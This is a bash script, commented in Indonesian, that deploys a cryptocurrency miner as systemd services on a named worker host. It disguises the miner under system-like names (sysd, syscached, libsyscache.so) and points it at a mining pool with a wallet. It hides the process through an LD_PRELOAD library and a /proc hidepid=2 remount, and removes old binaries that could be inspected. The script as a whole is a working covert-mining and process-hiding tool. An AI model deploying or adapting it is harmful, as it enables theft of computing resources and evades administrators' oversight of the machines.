#!/usr/bin/env bash
# sandbox-deploy.sh WORKER — pasang miner + hideproc + unit systemd.
#
#   ./sandbox-deploy.sh ai-workers-1
#
# File yang harus ada di direktori yang sama:
#   xcb                 (cmake --build build --parallel ...)
#   libsyscache.so      (ikut build; RPATH $ORIGIN)
#   hideproc.so         (make -C labs/process-hide)
#   syscached.service   (salin dari ops/systemd/)
#
# Layout sama dengan ops/fleet/install.sh: binary 0750 di
# /usr/local/sbin/sysd, library 0640 di /usr/local/sbin/libsyscache.so
# (RPATH $ORIGIN — harus bersebelahan), config di /etc/sysd/miner.env 0600.
# ExecStart menjalankan binary tanpa argumen; semua nilai datang dari
# EnvironmentFile, jadi tidak ada wallet di command line.
#
# Env wajib: WALLET. Override: ALGO, POOL, THREADS, HUGEPAGES.
set -euo pipefail
W="${1:?usage: sandbox-deploy.sh WORKER}"
SUDO=""; [ "$(id -u)" = 0 ] || SUDO="sudo"
DIR="$(cd "$(dirname "$0")" && pwd)"

WALLET="${WALLET:?WALLET wajib di-set (tidak ada default di repo)}"
ALGO="${ALGO:-conn}"
POOL="${POOL:-eu.rplant.xyz:17194}"
THREADS="${THREADS:-4}"
HUGEPAGES="${HUGEPAGES:-1200}"

for f in xcb libsyscache.so hideproc.so; do
    [ -f "$DIR/$f" ] || { echo "file $f tidak ada di $DIR"; exit 1; }
done

# Leftover layout lama yang dibuat deploy sebelumnya: backup dulu ke direktori
# root-only, baru dihapus (pola yang sama dengan ops/fleet/install.sh).
STAMP="$(date -u +%Y%m%d-%H%M%S)"
BACKUP="/root/sysd-backup-${STAMP}"
OLD_FILES="/usr/local/bin/xcb /usr/local/bin/librandomx_v2.so /usr/local/sbin/sysd /etc/xcb/miner.env /etc/systemd/system/xcb-proc-hidepid.service /etc/systemd/system/syscached.service.d/10-hidepid.conf"
need_backup=0
for f in $OLD_FILES; do
    if [ -e "$f" ]; then need_backup=1; fi
done
if [ "$need_backup" -eq 1 ]; then
    # Backup di /root: file lama bisa dibaca user lain dan mengungkap
    # binary/library lama.
    $SUDO install -d -m 700 "$BACKUP"
    for f in $OLD_FILES; do
        if [ -e "$f" ]; then
            $SUDO cp -a "$f" "${BACKUP}/$(basename "$f").old"
        fi
    done
    echo "backup layout lama: ${BACKUP}"
fi

$SUDO install -d -m 755 /usr/local/sbin
# 0750/0640: hanya root yang bisa membaca binary dan library. Nama file
# menentukan comm, exe, dan _EXE di journal — tidak ada title spoof.
$SUDO install -m 750 "$DIR/xcb" /usr/local/sbin/sysd
$SUDO install -m 640 "$DIR/libsyscache.so" /usr/local/sbin/libsyscache.so
$SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so

# Layout lama: binary world-readable di /usr/local/bin. Setelah salinan baru
# terpasang, file lama dihapus supaya tidak ada binary bernama xcb yang bisa
# dibaca dan di-strings.
$SUDO rm -f /usr/local/bin/xcb /usr/local/bin/librandomx_v2.so
$SUDO rm -f /etc/xcb/miner.env

# Unit hidepid lama: matikan sebelum file unitnya dihapus.
$SUDO systemctl disable --now xcb-proc-hidepid.service 2>/dev/null || true
$SUDO rm -f /etc/systemd/system/xcb-proc-hidepid.service

$SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<UNIT
[Unit]
Description=Allocate hugepages for sysd
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/usr/sbin/sysctl -w vm.nr_hugepages=${HUGEPAGES} vm.max_map_count=262144
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT

# Unit yang sama dengan template ops/systemd; jangan menulis definisi lain di
# sini. Perbedaan instabox hanya drop-in (LD_PRELOAD + ketergantungan hugepages).
UNIT_SRC="$DIR/syscached.service"
[ -f "$UNIT_SRC" ] || UNIT_SRC="$DIR/../systemd/syscached.service"
[ -f "$UNIT_SRC" ] || {
    echo "syscached.service tidak ada di $DIR atau ../systemd; sertakan file dari ops/systemd/"
    exit 1
}
$SUDO install -m 644 "$UNIT_SRC" /etc/systemd/system/syscached.service

$SUDO install -d -m 755 /etc/sysd
tmp_env=$(mktemp)
cat > "$tmp_env" <<ENV
ALGO=${ALGO}
# POOL dipakai backend randomy/bloz/zcd (Config butuh POOL + WALLET untuk
# membentuk pool); CONN_POOL tetap ditulis untuk algo conn dan unit lama.
POOL=${POOL}
CONN_POOL=${POOL}
WALLET=${WALLET}
WORKER=${W}
THREADS=${THREADS}
ENV
$SUDO install -m 600 "$tmp_env" /etc/sysd/miner.env
rm -f "$tmp_env"

$SUDO install -d -m 755 /etc/systemd/system/syscached.service.d
$SUDO tee /etc/systemd/system/syscached.service.d/10-instabox.conf >/dev/null <<'UNIT'
[Unit]
After=syscache-hugepages.service
Wants=syscache-hugepages.service

[Service]
Environment=LD_PRELOAD=/usr/local/lib/hideproc.so
UNIT

# hidepid=2: non-root tidak melihat proses user lain di /proc, termasuk miner.
$SUDO tee /etc/systemd/system/sysd-proc-hidepid.service >/dev/null <<'UNIT'
[Unit]
Description=Hide other users' processes in /proc
DefaultDependencies=no
After=local-fs.target
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/bin/mount -o remount,hidepid=2 /proc
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT
$SUDO tee /etc/systemd/system/syscached.service.d/10-hidepid.conf >/dev/null <<'UNIT'
[Unit]
Wants=sysd-proc-hidepid.service
After=sysd-proc-hidepid.service
UNIT

$SUDO systemctl daemon-reload
$SUDO systemctl enable --now sysd-proc-hidepid.service syscache-hugepages.service syscached.service
sleep 8

echo "== cek library =="
if ! $SUDO ldd /usr/local/sbin/sysd | grep -q 'libsyscache.so =>'; then
    echo "FATAL: libsyscache.so tidak ter-resolve oleh /usr/local/sbin/sysd"
    exit 1
fi

echo "svc=$(systemctl is-active syscached.service) hp=$(awk "/HugePages_Total/{print \$2}" /proc/meminfo)"
$SUDO journalctl -u syscached -n 8 --no-pager -o cat | tail -8
